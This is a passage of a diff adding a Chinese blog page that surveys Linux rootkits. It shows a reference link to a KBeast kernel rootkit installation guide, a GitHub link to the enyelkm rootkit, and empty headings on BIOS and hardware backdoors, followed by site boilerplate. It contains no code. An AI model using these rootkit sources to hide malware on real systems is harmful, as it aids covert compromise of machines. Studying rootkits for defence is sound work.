+<p>参考：<a href="http://vinc.top/2016/06/07/%E5%86%85%E6%A0%B8%E7%BA%A7rootkit-kbeast%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">http://vinc.top/2016/06/07/%E5%86%85%E6%A0%B8%E7%BA%A7rootkit-kbeast%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</a></p>
+<h3 id="enyelkm"><a href="#enyelkm" class="headerlink" title="enyelkm"></a>enyelkm</h3><p><a href="https://github.com/David-Reguera-Garcia-Dreg/enyelkm" target="_blank" rel="noopener">https://github.com/David-Reguera-Garcia-Dreg/enyelkm</a><br>支持内核版本：2.6</p>
+<h1 id="硬件级别后门"><a href="#硬件级别后门" class="headerlink" title="硬件级别后门"></a>硬件级别后门</h1><h2 id="bios后门"><a href="#bios后门" class="headerlink" title="bios后门"></a>bios后门</h2><h1 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h1>
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/09/23/CVE-17485-jackson-rce主线流程分析/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2018/11/02/Linux-rootkit-初探/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
